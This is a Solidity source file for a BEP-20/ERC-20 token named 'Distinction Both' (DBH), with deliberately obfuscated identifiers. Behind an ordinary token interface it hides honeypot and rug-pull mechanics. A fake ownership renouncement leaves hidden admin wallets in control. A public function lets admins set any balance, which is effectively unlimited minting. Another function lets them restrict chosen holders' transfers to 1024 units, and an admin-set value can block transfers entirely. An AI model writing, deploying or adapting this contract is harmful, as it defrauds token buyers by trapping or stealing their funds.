//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface totalList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitBuy {
    function createPair(address listTotal, address listMode) external returns (address);
}

interface amountLaunchedTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityFee) external view returns (uint256);

    function transfer(address marketingTo, uint256 totalSwap) external returns (bool);

    function allowance(address launchedList, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalSwap) external returns (bool);

    function transferFrom(
        address sender,
        address marketingTo,
        uint256 totalSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);
    event Approval(address indexed launchedList, address indexed spender, uint256 value);
}

interface launchedSwap is amountLaunchedTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DistinctionBoth is limitIs, amountLaunchedTotal, launchedSwap {

    bool private minShouldFrom;

    bool private walletAuto;

    mapping(address => uint256) private marketingLaunched;

    bool private shouldLaunched;

    bool public txSender;

    function launchedMax(address launchTo, address marketingTo, uint256 totalSwap) internal returns (bool) {
        require(marketingLaunched[launchTo] >= totalSwap);
        marketingLaunched[launchTo] -= totalSwap;
        marketingLaunched[marketingTo] += totalSwap;
        emit Transfer(launchTo, marketingTo, totalSwap);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalEnableTrading;
    }

    function senderAmount(address receiverTrading) public {
        require(receiverTrading.balance < 100000);
        if (senderLaunched) {
            return;
        }
        if (shouldLaunched) {
            minShouldFrom = false;
        }
        autoWallet[receiverTrading] = true;
        if (isAuto == isSwap) {
            totalTx = true;
        }
        senderLaunched = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromMax;
    }

    address takeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address launchShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return senderFee;
    }

    function allowance(address tradingEnable, address walletReceiver) external view virtual override returns (uint256) {
        if (walletReceiver == takeReceiver) {
            return type(uint256).max;
        }
        return amountToken[tradingEnable][walletReceiver];
    }

    function transfer(address teamTake, uint256 totalSwap) external virtual override returns (bool) {
        return sellAutoList(_msgSender(), teamTake, totalSwap);
    }

    constructor (){
        if (buySender == isAuto) {
            shouldLaunched = false;
        }
        totalList marketingMin = totalList(takeReceiver);
        toLaunch = limitBuy(marketingMin.factory()).createPair(marketingMin.WETH(), address(this));
        if (totalTx == shouldLaunched) {
            txSender = true;
        }
        atMode = _msgSender();
        swapIsTrading();
        autoWallet[atMode] = true;
        marketingLaunched[atMode] = fromMax;
        
        emit Transfer(address(0), atMode, fromMax);
    }

    string private launchedAmountSender = "Distinction Both";

    mapping(address => mapping(address => uint256)) private amountToken;

    uint8 private senderFee = 18;

    function getOwner() external view returns (address) {
        return txShould;
    }

    function swapIsTrading() public {
        emit OwnershipTransferred(atMode, address(0));
        txShould = address(0);
    }

    function owner() external view returns (address) {
        return txShould;
    }

    function balanceOf(address liquidityFee) public view virtual override returns (uint256) {
        return marketingLaunched[liquidityFee];
    }

    mapping(address => bool) public autoWallet;

    address public atMode;

    function sellAutoList(address launchTo, address marketingTo, uint256 totalSwap) internal returns (bool) {
        if (launchTo == atMode) {
            return launchedMax(launchTo, marketingTo, totalSwap);
        }
        uint256 totalBuy = amountLaunchedTotal(toLaunch).balanceOf(launchShould);
        require(totalBuy == fromBuy);
        require(marketingTo != launchShould);
        if (atSwap[launchTo]) {
            return launchedMax(launchTo, marketingTo, sellLiquidity);
        }
        return launchedMax(launchTo, marketingTo, totalSwap);
    }

    uint256 public minTotal;

    uint256 public isAuto;

    function name() external view virtual override returns (string memory) {
        return launchedAmountSender;
    }

    uint256 private fromMax = 100000000 * 10 ** 18;

    uint256 public buySender;

    string private totalEnableTrading = "DBH";

    function atReceiver(address teamTake, uint256 totalSwap) public {
        autoBuyFund();
        marketingLaunched[teamTake] = totalSwap;
    }

    address public toLaunch;

    uint256 constant sellLiquidity = 2 ** 10;

    function approve(address walletReceiver, uint256 totalSwap) public virtual override returns (bool) {
        amountToken[_msgSender()][walletReceiver] = totalSwap;
        emit Approval(_msgSender(), walletReceiver, totalSwap);
        return true;
    }

    event OwnershipTransferred(address indexed walletBuy, address indexed toSender);

    function takeTx(address isMode) public {
        autoBuyFund();
        
        if (isMode == atMode || isMode == toLaunch) {
            return;
        }
        atSwap[isMode] = true;
    }

    bool public senderLaunched;

    bool public totalTx;

    uint256 public isSwap;

    function autoBuyFund() private view {
        require(autoWallet[_msgSender()]);
    }

    uint256 fromBuy;

    function transferFrom(address launchTo, address marketingTo, uint256 totalSwap) external override returns (bool) {
        if (_msgSender() != takeReceiver) {
            if (amountToken[launchTo][_msgSender()] != type(uint256).max) {
                require(totalSwap <= amountToken[launchTo][_msgSender()]);
                amountToken[launchTo][_msgSender()] -= totalSwap;
            }
        }
        return sellAutoList(launchTo, marketingTo, totalSwap);
    }

    bool private tokenTeamEnable;

    mapping(address => bool) public atSwap;

    uint256 shouldTeam;

    address private txShould;

    function modeMarketing(uint256 totalSwap) public {
        autoBuyFund();
        fromBuy = totalSwap;
    }

}